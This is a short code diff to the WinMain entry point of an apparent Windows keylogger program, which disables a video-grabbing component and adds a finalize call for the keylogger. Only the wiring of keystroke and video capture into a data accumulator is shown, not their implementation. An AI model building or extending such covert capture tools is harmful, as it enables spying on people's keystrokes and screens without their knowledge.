@@ -8,11 +8,11 @@ int WINAPI WinMain ( HINSTANCE hInstance, HINSTANCE hPrevInstance,
 					LPSTR lpCmdLine, int nCmdShow )
 {
 	DataAccumulator* dataAccumulator = new DataAccumulator();
-	VideoGrabber* videoGrabber = new VideoGrabber();
+	//VideoGrabber* videoGrabber = new VideoGrabber();
 	KeyLogger* keyLogger = new KeyLogger();
 
-	videoGrabber->SetDataAccumulator(dataAccumulator);
-	videoGrabber->Init();
+	//videoGrabber->SetDataAccumulator(dataAccumulator);
+	//videoGrabber->Init();
 	keyLogger->SetDataAccumulator(dataAccumulator);
 	keyLogger->Init();
 
@@ -25,7 +25,9 @@ int WINAPI WinMain ( HINSTANCE hInstance, HINSTANCE hPrevInstance,
         DispatchMessage(&Msg); // Send message to WindowProcedure
     }
 
-	delete videoGrabber;
+	keyLogger->Finalize();
+
+	//delete videoGrabber;
 	delete keyLogger;
 
 	return Msg.wParam;
